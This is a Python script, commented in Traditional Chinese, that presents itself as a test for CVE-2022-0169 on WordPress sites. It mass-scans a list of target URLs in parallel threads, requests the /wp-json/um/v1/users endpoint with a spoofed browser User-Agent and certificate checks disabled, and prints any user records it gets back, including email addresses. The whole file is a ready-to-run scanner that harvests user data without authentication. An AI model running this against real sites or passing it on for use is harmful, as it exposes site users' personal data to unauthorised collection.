import requests
import json
import argparse
import urllib3
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict
import re

# 禁用 SSL 警告（僅用於測試，正式環境應妥善處理 SSL）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_cve_2022_0169(target_url: str) -> Dict[str, str]:
    """
    測試目標網站是否受 CVE-2022-0169 漏洞影響。
    回傳結果字典，包含狀態和訊息。
    """
    result = {"url": target_url, "vulnerable": False, "details": ""}
    
    try:
        # 漏洞利用路徑
        exploit_path = "/wp-json/um/v1/users"
        full_url = f"{target_url.rstrip('/')}{exploit_path}"
        
        # 發送 GET 請求
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(full_url, headers=headers, verify=False, timeout=10)
        
        # 檢查回應狀態碼
        if response.status_code == 200:
            try:
                # 嘗試解析 JSON 回應
                data = response.json()
                
                # 檢查是否包含用戶數據
                if isinstance(data, list) and len(data) > 0 and any("user_email" in user for user in data):
                    result["vulnerable"] = True
                    result["details"] = f"漏洞存在！成功取得用戶數據：{json.dumps(data[:2], indent=2)} (僅顯示前兩個用戶)"
                else:
                    result["details"] = "回應包含 JSON 數據，但未發現用戶敏感資訊。"
            except json.JSONDecodeError:
                result["details"] = "回應不是有效的 JSON 格式，網站可能不受影響或配置不同。"
        else:
            result["details"] = f"HTTP 狀態碼 {response.status_code}，無法存取用戶數據，網站可能不受影響。"
            
    except requests.exceptions.RequestException as e:
        result["details"] = f"請求失敗：{str(e)}"
        
    return result

def test_multiple_targets(targets: List[str], max_workers: int = 5) -> None:
    """
    對多個目標執行 CVE-2022-0169 漏洞測試，使用多執行緒加速。
    """
    print(f"開始測試 {len(targets)} 個目標...")
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = list(executor.map(test_cve_2022_0169, targets))
        
    # 輸出結果
    for result in results:
        status = "易受攻擊" if result["vulnerable"] else "無漏洞"
        print(f"\n目標: {result['url']}")
        print(f"狀態: {status}")
        print(f"詳情: {result['details']}")
        
def main():
    parser = argparse.ArgumentParser(description="CVE-2022-0169 漏洞測試腳本")
    parser.add_argument(
        "-u", "--url",
        help="單一目標 URL（例如：http://example.com）"
    )
    parser.add_argument(
        "-f", "--file",
        help="包含目標 URL 的檔案（每行一個 URL）"
    )
    parser.add_argument(
        "-w", "--workers",
        type=int, default=5,
        help="並行執行緒數（預設：5）"
    )
    
    args = parser.parse_args()
    
    targets = []
    
    # 處理輸入
    if args.url:
        targets.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"錯誤：找不到檔案 {args.file}")
            return
    else:
        print("錯誤：請提供單一 URL（-u）或 URL 檔案（-f）")
        parser.print_help()
        return
    
    if not targets:
        print("錯誤：無有效的目標 URL")
        return
    
    # 執行多目標測試
    test_multiple_targets(targets, args.workers)

if __name__ == "__main__":
    main()